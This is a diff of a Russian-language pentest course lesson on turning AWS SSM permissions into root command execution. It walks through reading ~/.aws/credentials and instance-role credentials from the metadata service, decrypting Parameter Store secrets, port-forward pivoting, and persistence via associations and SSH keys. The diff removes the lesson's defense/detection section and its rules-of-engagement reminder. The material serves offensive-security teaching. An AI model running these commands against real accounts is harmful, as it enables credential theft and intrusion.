@@ -15,192 +15,172 @@ estimated_minutes: 50
 summary: "Как ssm:SendCommand превращается в выполнение кода на инстансах, где лежат секреты в Parameter Store и как Session Manager даёт интерактивный доступ без SSH."
 ---
 
-## Зачем этот урок
+## Задача
 
-AWS Systems Manager (SSM) — это «удалённое управление парком»: обновления, инвентаризация, запуск команд, хранение параметров, интерактивные сессии. Для защитников это способ убрать SSH-ключи и bastion. Для атакующего это **RCE-as-a-service**: если у вашей роли есть `ssm:SendCommand`, вы выполняете команды на любом инстансе с SSM-агентом — от имени `root` (Linux) или `SYSTEM` (Windows), без единого открытого порта. Плюс Parameter Store и SecureString часто хранят пароли БД, API-ключи и токены. Этот урок — про то, как превратить права SSM в код и креды.
+**AWS Systems Manager (SSM)** — это «удалённое управление парком»: обновления, инвентаризация, запуск команд, хранение параметров, интерактивные сессии. Для защитников это способ убрать SSH-ключи и bastion. Для атакующего это **RCE-as-a-service**: право `ssm:SendCommand` позволяет выполнять команды на инстансе от имени `root`, **без единого открытого порта**.
 
-## Как устроен SSM
+Цель урока: превратить права SSM в выполнение кода и креды.
 
-Ключевые компоненты:
+## Данные, с которыми работаем
 
-- **SSM Agent** — демон на инстансе (`amazon-ssm-agent`), который держит исходящее соединение к сервису SSM. Порты наружу не нужны.
-- **Managed instance** — инстанс, зарегистрированный в SSM (имеет `mi-...` id). Требует instance profile с `AmazonSSMManagedInstanceCore`.
-- **Documents** — скрипты/плейбуки (AWS-предоставленные и свои). `AWS-RunShellScript` — самый важный.
-- **Run Command** — `ssm:SendCommand` исполняет документ на выбранных инстансах.
-- **Parameter Store** — иерархическое хранилище параметров; `SecureString` шифруется KMS.
-- **Session Manager** — интерактивная сессия (shell) через SSM, без SSH и открытых портов.
+Разберём компоненты:
+- **SSM Agent** — демон на инстансе, который держит **исходящее** соединение к сервису SSM. Входящие порты не нужны.
+- **Managed instance** — инстанс, зарегистрированный в SSM (id вида `mi-...`).
+- **Documents** — скрипты; главный — `AWS-RunShellScript`.
+- **Run Command** — `ssm:SendCommand` исполняет документ на инстансах.
+- **Parameter Store** — хранилище параметров; `SecureString` шифруется KMS.
+- **Session Manager** — интерактивный shell без SSH.
 
-Права, которые ищет атакующий: `ssm:SendCommand`, `ssm:StartSession`, `ssm:GetParameter(s)`, `ssm:GetCommandInvocation`, `ssm:DescribeInstanceInformation`.
-
-## Инструменты и команды
-
-Разведка парка:
+Смотрим, какие инстансы управляются:
 
 ```bash
-# Какие инстансы управляются SSM
-aws ssm describe-instance-information \
-  --query 'InstanceInformationList[].{Id:InstanceId,Name:ComputerName,Ping:PingStatus,Platform:PlatformName}'
-
-# Список документов
-aws ssm list-documents --filters Key=Owner,Values=Self
+$ aws ssm describe-instance-information \
+    --query 'InstanceInformationList[].{Id:InstanceId,Platform:PlatformName,Ping:PingStatus}'
+[{"Id":"i-0abc123","Platform":"Linux","Ping":"Online"}]
 ```
 
-RCE через Run Command:
+Инстанс `i-0abc123` онлайн. Проверяем, что наша роль умеет:
 
 ```bash
-aws ssm send-command \
-  --document-name "AWS-RunShellScript" \
-  --targets "Key=instanceids,Values=i-0123456789abcdef0" \
-  --parameters 'commands=["id","hostname","cat /etc/passwd | head"]' \
-  --output text --query 'Command.CommandId'
-# => 8f2c...
-
-# Получить результат (подождать несколько секунд)
-aws ssm get-command-invocation \
-  --command-id 8f2c... --instance-id i-0123456789abcdef0 \
-  --query 'StandardOutputContent' --output text
+$ aws iam simulate-principal-policy \
+    --policy-source-arn arn:aws:iam::111122223333:role/app \
+    --action-names ssm:SendCommand --resource-arns "*" \
+    --query 'EvaluationResults[0].EvalDecision'
+"allowed"
 ```
 
-Чтение Parameter Store:
+## Шаг 1: запускаем команду
+
+`send-command` возвращает `CommandId` — по нему потом читаем результат:
 
 ```bash
-aws ssm describe-parameters --query 'Parameters[].Name'
-aws ssm get-parameters-by-path --path "/" --recursive --with-decryption \
-  --query 'Parameters[].{Name:Name,Value:Value}'
+$ aws ssm send-command --document-name "AWS-RunShellScript" \
+    --targets "Key=instanceids,Values=i-0abc123" \
+    --parameters 'commands=["whoami","id","cat /home/ec2-user/.aws/credentials 2>/dev/null"]' \
+    --query 'Command.CommandId' --output text
+8f2c-1234
 ```
 
-Session Manager:
+## Шаг 2: читаем вывод
+
+Подождав пару секунд, забираем результат. До завершения `get-command-invocation` вернёт `InProgress`:
 
 ```bash
-aws ssm start-session --target i-0123456789abcdef0
-# Требует Session Manager plugin; даёт интерактивный shell
+$ aws ssm get-command-invocation --command-id 8f2c-1234 --instance-id i-0abc123 \
+    --query 'StandardOutputContent' --output text
+root
+uid=0(root) gid=0(root) groups=0(root)
+[default]
+aws_access_key_id = AKIA...
+aws_secret_access_key = wJalr...
 ```
 
-## Разобранный пример: от права SendCommand к root на инстансе
+Мы — **root** на инстансе, и там лежат креды ещё одного пользователя. SSM-агент исполняет команды от root, поэтому это прямой RCE.
 
-Сценарий: после Cognito/утечки ключа у роли есть `ssm:*`. Разведка показывает managed instance `i-0abc`.
+## Шаг 3: выясняем креды роли инстанса
 
-Шаг 1 — определяем платформу инстанса, чтобы выбрать документ:
+У инстанса почти всегда есть **instance profile** — роль, привязанная к EC2. Её креды выдаёт metadata-сервис:
 
 ```bash
-aws ssm describe-instance-information \
-  --query 'InstanceInformationList[].{Id:InstanceId,Platform:PlatformName,Ping:PingStatus}'
-[{"Id":"i-0abc","Platform":"Linux","Ping":"Online"}]
+$ aws ssm send-command --document-name "AWS-RunShellScript" \
+    --targets "Key=instanceids,Values=i-0abc123" \
+    --parameters 'commands=["curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"]' \
+    --query 'Command.CommandId' --output text
+9a1b-5678
+$ aws ssm get-command-invocation --command-id 9a1b-5678 --instance-id i-0abc123 \
+    --query 'StandardOutputContent' --output text
+WebServerRole
 ```
 
-Шаг 2 — запускаем команду. Полезно сразу выяснить, кто мы и какие креды есть на инстансе:
+Роль инстанса `WebServerRole` обычно шире, чем наша. Забираем её креды:
 
 ```bash
-aws ssm send-command --document-name "AWS-RunShellScript" \
-  --targets "Key=instanceids,Values=i-0abc" \
-  --parameters 'commands=["whoami","id","curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"]' \
-  --output text --query 'Command.CommandId'
+$ aws ssm send-command --document-name "AWS-RunShellScript" \
+    --targets "Key=instanceids,Values=i-0abc123" \
+    --parameters 'commands=["curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole"]'
 ```
 
-Шаг 3 — читаем вывод. `whoami` вернёт `root` (SSM-агент исполняет команды от root). Если на инстансе есть instance profile, `curl` к metadata вернёт имя роли — а следующий запрос отдаст **креды роли инстанса**, которые обычно шире, чем ваши:
+## Шаг 4: читаем Parameter Store
+
+Часто именно в Parameter Store лежат пароли БД и токены:
 
 ```bash
-aws ssm get-command-invocation --command-id 8f2c... --instance-id i-0abc \
-  --query 'StandardOutputContent' --output text
-# root
-# uid=0(root) gid=0(root) groups=0(root)
-# WebServerRole
+$ aws ssm get-parameters-by-path --path "/prod/" --recursive --with-decryption \
+    --query 'Parameters[].{Name:Name,Value:Value}' --output table
+---------------------------------------------
+|  Name              |  Value               |
+|  /prod/db/password |  Prod_DB_S3cret!     |
+|  /prod/api/token   |  sk_live_51H...      |
+---------------------------------------------
 ```
 
-Шаг 4 — расширяем доступ. Через SSM можно выкачать приватный SSH-ключ, положить свой ключ в `authorized_keys`, поднять reverse shell или сразу прочитать `~/.aws/credentials` и переменные окружения сервисов:
+`--with-decryption` расшифровывает `SecureString`. Цепочка готова: `ssm:SendCommand` → root → instance profile → Parameter Store → пароль БД → lateral movement.
+
+## Полный прогон от начала до конца
+
+1. `describe-instance-information` → нашли managed instance.
+2. `send-command` с `whoami` → root на инстансе.
+3. Прочитали креды из `~/.aws` и metadata → роль инстанса.
+4. `get-parameters-by-path --with-decryption` → пароль БД и API-токен.
+
+## Если SendCommand запрещён: Session Manager и другие права
+
+- **Session Manager.** Право `ssm:StartSession` — **независимое** от `SendCommand`. Оно даёт интерактивный shell и port forwarding:
 
 ```bash
-aws ssm send-command --document-name "AWS-RunShellScript" \
-  --targets "Key=instanceids,Values=i-0abc" \
-  --parameters 'commands=["cat /home/*/.aws/credentials 2>/dev/null","env | grep -i aws","ls -la /root/.ssh"]' \
-  --output text --query 'Command.CommandId'
+$ aws ssm start-session --target i-0abc123
+sh-5.2$
 ```
 
-Шаг 5 — Parameter Store. Часто именно там лежат пароли БД, которые открывают следующий хост:
+- **Port forwarding** через инстанс — pivot без установки туннельного бинарника:
 
 ```bash
-aws ssm get-parameters-by-path --path "/prod/" --recursive --with-decryption \
-  --query 'Parameters[].{Name:Name,Value:Value}' --output table
+$ aws ssm start-session --target i-0abc123 \
+    --document-name AWS-StartPortForwardingSession \
+    --parameters '{"portNumber":["3306"],"localPortNumber":["13306"]}'
 ```
 
-Цепочка: `ssm:SendCommand` → root на инстансе → instance profile креды → Parameter Store → пароль БД → lateral movement.
+Теперь `mysql -h 127.0.0.1 -P 13306` идёт к БД во внутренней подсети.
 
-## Варианты атак и обходы
-
+- **`ssm:GetParameter` без RCE.** Иногда права на конкретный путь уже дают пароль БД — не поднимай Run Command там, где хватит чтения параметра.
 - **Windows.** Документ `AWS-RunPowerShellScript` даёт исполнение от `NT AUTHORITY\SYSTEM`.
-- **Через ассоциации.** `ssm:CreateAssociation` с расписанием позволяет закрепиться: команда будет выполняться периодически.
-- **Session Manager без SSH.** `start-session` даёт полноценный PTY; можно поднять port-forwarding (`AWS-StartPortForwardingSession`) к внутренним сервисам — то есть использовать инстанс как pivot.
-- **Parameter Store как источник.** Даже без `SendCommand` право `ssm:GetParameter*` на `SecureString` может отдать креды. Ищите пути вроде `/prod/db/password`, `/ci/tokens`.
-- **Обход через State Manager.** Если `SendCommand` запрещён, но разрешён `CreateAssociation`, добиваемся того же результата легальной ассоциацией.
-- **Эксфильтрация через SSM.** Вывод команды читается через `GetCommandInvocation` — не нужен открытый канал наружу.
+- **Персистентность.** `ssm:CreateAssociation` с расписанием выполняет команду периодически; можно положить свой SSH-ключ в `authorized_keys`.
+- **Hybrid activations.** SSM регистрирует on-prem сервер как managed instance — тогда `SendCommand` исполняет код **вне облака**, в ДЦ компании.
 
 ## Частые ошибки и подводные камни
 
-- **Инстанс не managed.** Если SSM-агента нет или instance profile без `AmazonSSMManagedInstanceCore`, `SendCommand` не сработает.
-- **Ждать вывода сразу.** `GetCommandInvocation` до завершения вернёт `InProgress`; делайте паузу или поллинг.
-- **Квота вывода.** Вывод команды усечён (по умолчанию ~24 КБ). Для больших файлов пишите в S3 и забирайте оттуда, либо base64-частями.
-- **Не проверять `get-caller-identity`.** Убедитесь, что это ваш доступ, а не shared role.
-- **Логировать в CloudTrail каждый шаг.** `SendCommand` — громкое событие; для OPSEC помните, что оно остаётся в логах.
-- **`--parameters` JSON.** Неправильные кавычки в `commands=[...]` — частая ошибка; проверяйте формат.
+- **Инстанс не managed.** Без SSM-агента и instance profile с `AmazonSSMManagedInstanceCore` команда не сработает.
+- **Ждать вывода сразу.** `get-command-invocation` до завершения вернёт `InProgress` — нужна пауза или поллинг.
+- **Забывать про квоту вывода.** Вывод усечён (~24 КБ); большие файлы выгружайте в S3 частями.
+- **Не проверять `get-caller-identity`.** Убедитесь, что это ваш доступ, а не общая роль.
+- **Считать, что SSM тихий.** Каждое `SendCommand`/`StartSession`/`GetParameter` пишется в CloudTrail.
+- **Путать `SendCommand` и `StartSession`.** Это независимые права; наличие только второго тоже даёт интерактивный доступ.
 
-## Защита и детект
+- **Игнорировать Windows-парк.** Для Windows нужен документ `AWS-RunPowerShellScript`, и исполнение идёт от `NT AUTHORITY\SYSTEM`.
+- **Считать, что SSM только про EC2.** Hybrid activations регистрируют on-prem серверы, а ECS-задачи могут быть managed instances.
 
-- **Минимальные права.** `ssm:SendCommand`/`StartSession` не должны быть у широких ролей. Ограничивайте resource-ARN и тегами инстансов.
-- **Ограничивайте Parameter Store.** `SecureString` с `kms:Decrypt`-условиями; не храните долгоживущие креды в открытых путях.
-- **Детект.** CloudTrail события `SendCommand`, `StartSession`, `GetParameter`. GuardDuty findings `Discovery:...`, `UnauthorizedAccess:IAMUser/...`. Алерты на `SendCommand` с необычного principal, на чтение секретных параметров вне CI.
-- **Аудит.** Включите логирование SSM-сессий (Session Manager logging в S3/CloudWatch) и запись команд Run Command.
-- **Мониторинг.** Необычные ассоциации State Manager, новые документы, `StartSession` из внешнего IP.
+- **Не проверять Parameter Store заранее.** Иногда чтения одного параметра достаточно, и поднимать Run Command не нужно.
 
-## SSM в контейнерах, гибридных и мульти-аккаунт средах
+- **Забывать про ассоциации.** `ssm:CreateAssociation` даёт персистентность — команда выполняется по расписанию без вашего участия.
 
-SSM не ограничен EC2. Понимание этих вариантов расширяет поверхность:
+## Что мы теперь знаем
 
-- **ECS/Fargate.** Задачи ECS могут быть зарегистрированы как managed instances, если включён `ExecuteCommand` (через SSM-агент в контейнере). Тогда `ssm:StartSession` даёт shell внутри контейнера, а права — это **task role**, а не instance role (`cloud-aws-ecs`).
-- **On-premises (гибрид).** SSM Hybrid Activations регистрируют сервер вне AWS как managed instance. Если активация скомпрометирована, `SendCommand` исполняет код на инфраструктуре компании вне облака — это мост из AWS в ДЦ.
-- **Мульти-аккаунт.** `SendCommand` действует в рамках аккаунта и региона. Для lateral movement между аккаунтами нужен либо `sts:AssumeRole`, либо SSM-документ, который сам вызывает API с ролью инстанса.
-- **Parameter Store shared.** Через `ssm:GetParametersByPath` можно читать параметры, общие для всей организации, — часто там лежат общие секреты CI и БД.
+- `ssm:SendCommand` = RCE от root/SYSTEM без открытых портов (агент ходит исходящим соединением).
+- `get-command-invocation` возвращает вывод команды после завершения.
+- На инстансе лежат креды instance profile (metadata) и часто `~/.aws`.
+- Parameter Store (`--with-decryption`) — типовое хранилище паролей и токенов.
+- `ssm:StartSession` — независимое право, даёт shell и port forwarding.
+- SSM «громкий»: каждое действие пишется в CloudTrail.
 
-Отдельно стоит **Session Manager port forwarding** — недооценённый инструмент pivot:
+## На что смотреть дальше
 
-```bash
-# Пробросить локальный порт к внутреннему сервису через инстанс
-aws ssm start-session --target i-0abc \
-  --document-name AWS-StartPortForwardingSession \
-  --parameters '{"portNumber":["3306"],"localPortNumber":["13306"]}'
-# Теперь mysql -h 127.0.0.1 -P 13306 идёт к БД во внутренней подсети
-```
-
-Это превращает managed instance в точку pivot без установки туннельного бинарника — трафик идёт по уже разрешённому исходящему соединению SSM-агента.
-
-## SSM vs другие механизмы удалённого исполнения
-
-| Механизм | Нужен открытый порт | Пользователь на цели | Тип доступа |
-|----------|--------------------|----------------------|-------------|
-| SSM Run Command | Нет | root/SYSTEM | Неинтерактивный RCE |
-| SSM Session Manager | Нет | root/SYSTEM | Интерактивный shell/порт-форвард |
-| EC2 Instance Connect | 22 (или через агент) | указанный | SSH-вход |
-| EC2 serial console | Нет | root | Консоль |
-| Lambda invoke | Нет | роль функции | Serverless RCE |
-
-Практический вывод: `ssm:SendCommand` и `ssm:StartSession` — это два независимых права, и наличие только `StartSession` тоже даёт интерактивный доступ. Проверяйте оба в разведке прав. Если `SendCommand` запрещён, но `StartSession` разрешён — вы всё равно внутри.
-
-## OPSEC и снижение шума
-
-SSM — один из самых «громких» сервисов AWS: каждое `SendCommand`, `StartSession` и `GetParameter` пишется в CloudTrail с вашим principal ARN. Практические соображения:
-
-- **Минимизируйте число вызовов.** Одна команда, возвращающая сразу `id`, окружение и содержимое `~/.aws`, лучше десяти мелких.
-- **Не создавайте очевидных артефактов.** Новые документы с вашим именем, ассоциации State Manager с расписанием и свои SSH-ключи в `authorized_keys` надолго остаются в аккаунте и легко обнаруживаются.
-- **Учитывайте регион.** SSM-инстансы видны только в своём регионе; сканирование всех регионов увеличивает шум.
-- **Parameter Store читается без RCE.** Иногда право `ssm:GetParameter` на конкретный путь уже даёт пароль БД — не поднимайте Run Command там, где хватит чтения параметра.
-- **Session Manager логируется отдельно.** Если включено логирование сессий в S3/CloudWatch, весь ваш интерактивный ввод сохранится — это прямой след для IR.
-
-Помните, что цель пентеста — не просто получить RCE, а показать путь и остаться в рамках согласованных правил. Если `SendCommand` — «шумный» и легко детектируемый путь, отметьте это в отчёте как риск: команда защиты должна видеть такие вызовы.
-
-## Что дальше / решение
-
-`ssm:SendCommand` — это почти всегда RCE. Первым делом выясните, **кто вы на инстансе** (`whoami`, `id`) и **какие креды там лежат** (instance profile, `~/.aws`, переменные окружения, файлы сервисов). Затем — Parameter Store: он часто содержит «ключ к следующей двери». Если цель — персистентность, используйте ассоциации или положите свой SSH-ключ. Дальше маршрутизируйте всё через инстанс как pivot (`svc-pivoting`) и идите вглубь VPC. Записывайте каждый шаг как attack step с командой и выводом.
+- **aws-ecs**: task role и `ExecuteCommand` как аналог SSM для контейнеров.
+- **cloud-network-security**: сетевые барьеры, которые SSM обходит.
+- **cloud-privesc-iam**: что делать с кредами роли инстанса.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "От какого пользователя SSM Run Command исполняет команды на Linux-инстансе?"
@@ -218,7 +198,7 @@ SSM — один из самых «громких» сервисов AWS: каж
     - "SSM работает только локально"
     - "SSM использует DNS"
   answer: 0
-  explanation: "Агент polling-ом держит исходящий канал, поэтому bastion/SSH не нужны."
+  explanation: "Агент polling-ом держит исходящий канал, поэтому bastion и SSH не нужны."
 - question: "Где часто лежат пароли БД для следующего шага?"
   options:
     - "В SSM Parameter Store (SecureString)"
@@ -235,7 +215,19 @@ SSM — один из самых «громких» сервисов AWS: каж
     - "Никак, вывод недоступен"
   answer: 0
   explanation: "GetCommandInvocation возвращает StandardOutputContent после завершения."
+- question: "Почему Session Manager — отдельный вектор?"
+  options:
+    - "Право ssm:StartSession независимо от SendCommand и даёт shell и port forwarding"
+    - "Он требует открытый порт 22"
+    - "Он работает только на Windows"
+    - "Он отключает CloudTrail"
+  answer: 0
+  explanation: "StartSession — самостоятельное право; даже без SendCommand вы получаете доступ."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **ECS и Fargate** — task role и `ExecuteCommand` как аналог SSM для контейнеров. А пока главное запомни: **SSM превращает облачные права в код на парке машин без единого порта**, и `SendCommand` от root стоит дороже любого открытого SSH.
 
 ## Где пригодится
 
